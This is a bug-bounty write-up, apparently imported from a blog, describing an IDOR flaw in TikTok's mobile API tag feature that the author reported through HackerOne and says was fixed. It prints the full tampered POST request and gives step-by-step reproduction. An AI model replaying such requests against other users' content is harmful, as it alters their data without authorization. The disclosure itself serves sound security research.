---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-20_tag-myself-in-your-favorite-tiktok-artist-video-idor.md
original_filename: 2022-09-20_tag-myself-in-your-favorite-tiktok-artist-video-idor.md
title: Tag Myself in Your Favorite TikTok Artist Video [IDOR]
category: documents
detected_topics:
- mobile-security
- idor
- command-injection
- otp
- api-security
tags:
- imported
- documents
- mobile-security
- idor
- command-injection
- otp
- api-security
language: en
raw_sha256: 70f31e419c828b94ec0696a163c5d0c4050fc8443210e4498ce185de84a21dec
text_sha256: 4805a08233fe6c7726b0b798a704b30a56382168a9e9ccdf94bd304365b8c183
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# Tag Myself in Your Favorite TikTok Artist Video [IDOR]

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-20_tag-myself-in-your-favorite-tiktok-artist-video-idor.md
- Source Type: markdown
- Detected Topics: mobile-security, idor, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `70f31e419c828b94ec0696a163c5d0c4050fc8443210e4498ce185de84a21dec`
- Text SHA256: `4805a08233fe6c7726b0b798a704b30a56382168a9e9ccdf94bd304365b8c183`


## Content

---
title: "Tag Myself in Your Favorite TikTok Artist Video [IDOR]"
page_title: "Tag Myself in Your Favorite TikTok Artist Video  [IDOR] – Apapedulimu"
url: "https://apapedulimu.click/tag-myself-in-your-favorite-tiktok-artist-video-idor/"
final_url: "https://apapedulimu.click/tag-myself-in-your-favorite-tiktok-artist-video-idor/"
authors: ["apapedulimu / Nosa Shandy (@LocalHost31337)"]
programs: ["TikTok"]
bugs: ["IDOR"]
bounty: "3,000"
publication_date: "2022-09-20"
added_date: "2022-09-22"
source: "pentester.land/writeups.json"
original_index: 2148
---

![](https://apapedulimu.click/wp-content/uploads/2022/08/IDOR-825x510.png)

# Tag Myself in Your Favorite TikTok Artist Video [IDOR]

# **﷽**

**In the name of Allah, the Most Gracious, the Most Merciful.**

## Beginning

On H-1 Eidul Fitri I spent my time on in front of my laptop while listening to Takbir from the nearest mosque. Doing bug bounty and targeting TikTok mobile apps.

With my laptop and my old iPhone 6s+, I started to learn and try to hack TikTok in a good way. I’m focussing on the feature on the mobile apps and on the Access-Control issue.

## Stuck

Because the theme of the hunt is the “**Access-Control** ” Issue, I started poking around the TikTok feature related to what can and cannot the user access. Looking at my burp suite and navigating the TikTok Apps feature to there and here and there again, and here again. No clue, lost!

## Get Some Clue

After stuck, I try to focus on the feature related to TikTok video. Long story short, I get some clue, looks like some endpoints is vulnerable with an IDOR! The tag feature! I try to change the video id to another video id but won’t work, strange! The status not reject the request or anything. There’s just video id and “**add_uids** ” parameter on the post request.

But, I try again, I try to remove the tag and tag another people and change the video id to victim. it will add more parameter says “**remove_uids** ” on the post request. It’s says **success**! And when I take a look the another video I see that I be able to tag someone on another users video!

But, It’s strange right? You need parameter “**remove_uids** ” and you can be able perform IDOR, when I remove the parameter The IDOR not work as expected.

The Post Request will look like this:
  
  
  POST /tiktok/interaction/mention/tag/update/v1?residence=ID&device_id=7049655035710670337&os_version=14.4.2&iid=7088340292101621530&app_name=trill&locale=en&ac=WIFI&sys_region=ID&js_sdk_version=&version_code=22.8.2&channel=App%20Store&op_region=ID&tma_jssdk_version=&os_api=18&idfa=192B53E4-8964-49BB-A03B-CB8EA01485BC&idfv=192B53E4-8964-49BB-A03B-CB8EA01485BC&device_platform=iphone&device_type=iPhone8,2&openudid=a498f4c031fe4de2f2e6315a610c39f9a847ee79&account_region=id&tz_name=Asia/Jakarta&tz_offset=25200&app_language=en&current_region=ID&build_number=228201&aid=1180&mcc_mnc=&screen_width=1242&uoo=1&content_language=&language=en&cdid=F1E3FFE9-7053-4600-8CC0-135AF4AAAF29&app_version=22.8.2 HTTP/2
  Host: api22-normal-c-useast2a.tiktokv.com
  Cookie: cookie
  Content-Length: 101
  Passport-Sdk-Version: 5.12.1
  X-Tt-Token: token ***REDACTED***: 2.2.0
  Content-Type: application/x-www-form-urlencoded
  User-Agent: TikTok 22.8.2 rv:228201 (iPhone; iOS 14.4.2; en_ID) Cronet
  X-Tt-Cmpl-Token: AgQQAPOgF-RP_Y_iXVdt8d04-7T-1C8LP4MrYMBsKg
  Sdk-Version: 2
  X-Tt-Dm-Status: login=1;ct=1;rt=1
  X-Ss-Stub: ***REDACTED-SUSPECT-TOKEN***  X-Tt-Store-Idc: useast2a
  X-Tt-Store-Region: id
  X-Tt-Store-Region-Src: uid
  X-Bd-Kmsv: 0
  X-Ss-Dp: 1180
  X-Tt-Trace-Id: 00-7b53c0751061d567e780940601e9049c-7b53c0751061d567-01
  Accept-Encoding: gzip, deflate
  X-Ladon: vWpFBboRv69O9ymA2KFoSIpQ1D0kJKThJcrTBC9/M5s1lfjm
  X-Khronos: 1651336527
  X-Argus: +HwVwzxC2/WbovVsHBeKOZ6naYMtWF34J2KwlChRY4np1DmEhtsSKSDNdF1kj+47hlAq4FS8/HcJS1NLRjTVFA3LVmHT+mbavL+CkP4+66qk2HzgUgq6tvlmaQXvwl972mDZkRSZIGSxkRjGn0vyELn7K0bW3qu5ZI3nwdAFMBwjMJ3WuPi83aqDPYVPYJ3Wnt5chQi/GSInydL8+Z36Xfn9gzRGPxio2mJCXjFDIRZhnQ9h1wQGQId9+qczY/oh0yN82ep5QniFYcntubeCvdqa63O9znKisMwXtDVLtxjCNhew/***REDACTED-SUSPECT-TOKEN***  X-Gorgon: 8404c0f62000***REDACTED-SUSPECT-TOKEN***  add_uids=%5B6868261750475621377%5D&aweme_id=7031653349946707201&remove_uids=%5B6948164304332555266%5D

Don’t care with this behaviour, I straight forward to record how I reproduce the IDOR and send it to [TikTok on Hackerone.](https://hackerone.com/tiktok)

## Step To Reproduce

The clearly step to reproduce it will be like this:

  1. Tagged people on some video, and then untagged the people and changed to another people.
  2. See the response. Edit the `aweme_id` parameter to any `aweme_id` ID (Video ID)
  3. Take a look on the video with `aweme_id` you changed. The videos will be tagged people you tag on your video!

TikTok Team already fixed this issue quickly after I reported this to them. 

## Conclusions

From this test case, I tell my self that I need to explore all feature and not assume same feature / endpoint not vulnerable based on test in 1 features.

## Timeline

  * **Apr 30th 2022** – Report via Hackerone
  * **May 5th 2022** – Hackerone Staff Triaged
  * **May 6th 2022** – Update the CVSS
  * **May 13th 2022** – Resolved
  * **Jun 7th 2022** – Bounty 2,500$ + 500$ Bonus

## Published by

![](https://secure.gravatar.com/avatar/4a2c0028ce53c37ad1d454a4dd5fb9ef9b89570464cdfbbc14e7e4914a284f17?s=56&d=mm&r=g)

### apapedulimu

Urip Kui Urup [ View all posts by apapedulimu ](https://apapedulimu.click/author/apapedulimu/)

Posted on [September 20, 2022](https://apapedulimu.click/tag-myself-in-your-favorite-tiktok-artist-video-idor/)Author [apapedulimu](https://apapedulimu.click/author/apapedulimu/)Tags [Bug Bounty](https://apapedulimu.click/tag/bug-bounty/), [TikTok](https://apapedulimu.click/tag/tiktok/)
